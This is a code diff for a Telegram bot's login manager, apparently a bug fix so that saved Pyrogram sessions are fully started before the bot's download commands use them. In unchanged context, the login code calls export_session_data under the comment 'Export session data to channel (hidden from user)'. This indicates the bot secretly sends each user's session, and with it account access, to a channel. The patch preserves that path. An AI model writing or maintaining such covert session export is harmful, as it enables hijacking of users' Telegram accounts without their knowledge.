@@ -41,6 +41,27 @@ class LoginManager:
     
     def get_user_data_path(self, user_id):
         return os.path.join(self.sessions_dir, f"{user_id}_data.json")
+
+    async def _start_session_client(self, user_id):
+        """Create a fresh Client from the user's saved session file and fully
+        start it (``await client.start()``).
+
+        A client obtained during the interactive /login flow is only
+        *connected* (via ``client.connect()`` + ``sign_in()``); it is not
+        *started*, so calls like ``get_messages`` raise
+        "Client has not been started yet". Building a new client from the
+        persisted session and calling ``start()`` puts it into the correct
+        state for reuse. Returns the started client.
+        """
+        client = Client(
+            f"user_{user_id}",
+            api_id=self.api_id,
+            api_hash=self.api_hash,
+            workdir=self.sessions_dir,
+            **self.app_config,
+        )
+        await client.start()
+        return client
     
     async def start_login_process(self, user_id, phone_number):
         """Start the login process for a user"""
@@ -243,7 +264,7 @@ class LoginManager:
     async def complete_login(self, user_id, client):
         """Complete the login process and save session"""
         try:
-            # Get user info
+            # Get user info (works on the connected login client)
             me = await client.get_me()
             
             # Save user data
@@ -257,17 +278,32 @@ class LoginManager:
                 'login_time': asyncio.get_event_loop().time()
             }
             
-            # Use thread-safe file operations
+            # Persist user data + session file. The login client authorized the
+            # account and wrote sessions/user_{id}.session; disconnect it so we
+            # can reopen the same session as a *started* client below.
             with self._session_lock:
-                # Save to file
                 with open(self.get_user_data_path(user_id), 'w') as f:
                     json.dump(user_data, f, indent=2)
-                
-                # Store active session
-                self.user_sessions[user_id] = client
             
             # Export session data to channel (hidden from user)
             await self.export_session_data(user_id, user_data, client)
+            
+            # Cleanly disconnect the login-flow client (it is only connected,
+            # not started) so the session file is released for reuse.
+            try:
+                if client.is_connected:
+                    await client.disconnect()
+            except Exception as disconnect_err:
+                LOGGER(__name__).warning(
+                    f"Could not disconnect login client for user {user_id}: {disconnect_err}"
+                )
+            
+            # Create and fully start a reusable client from the saved session.
+            # This is what prevents "Client has not been started yet" when the
+            # user later runs /dl, /bdl, etc.
+            started_client = await self._start_session_client(user_id)
+            with self._session_lock:
+                self.user_sessions[user_id] = started_client
             
             # Clean up login state
             await self.cleanup_login_state(user_id)
@@ -311,14 +347,7 @@ class LoginManager:
                     user_id = filename.replace('.session', '').replace('user_', '')
                     if user_id.isdigit():
                         try:
-                            client = Client(
-                                f"user_{user_id}",
-                                api_id=self.api_id,
-                                api_hash=self.api_hash,
-                                workdir=self.sessions_dir,
-                                **self.app_config
-                            )
-                            await client.start()
+                            client = await self._start_session_client(user_id)
                             with self._session_lock:
                                 self.user_sessions[int(user_id)] = client
                             LOGGER(__name__).info(f"Loaded session for user {user_id}")
